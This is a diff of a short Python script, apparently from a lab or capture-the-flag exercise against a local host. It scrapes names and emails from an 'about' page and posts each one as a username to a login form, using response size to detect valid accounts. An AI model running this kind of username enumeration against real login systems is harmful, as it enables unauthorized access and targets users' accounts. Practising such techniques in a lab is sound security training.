@@ -5,8 +5,20 @@ from bs4 import BeautifulSoup
 r = requests.get('http://192.168.56.68:8080/about.html')
 soup = BeautifulSoup(r.text, 'html.parser')
 
-# Print raw table structure to see all columns
-rows = soup.find_all('tr')
-for row in rows[:3]:  # just first 3 rows to see structure
-    print(row)
-    print("---")
+rows = soup.find_all('tr')[1:]  # skip header row
+
+for row in rows:
+    cells = row.find_all('td')
+    if len(cells) >= 3:
+        first = cells[0].text.strip()
+        last = cells[1].text.strip()
+        email = cells[2].text.strip()
+        
+        # Try email, first name, last name, and full name
+        for username in [email, first, last, f"{first} {last}"]:
+            r2 = requests.post('http://192.168.56.68:8080/login-3',
+                              data={'username': username, 'password': 'test'})
+            size = len(r2.text)
+            if size != 1102:
+                print(f"*** FOUND *** username='{username}' -> {size} bytes")
+                print(r2.text[:100])
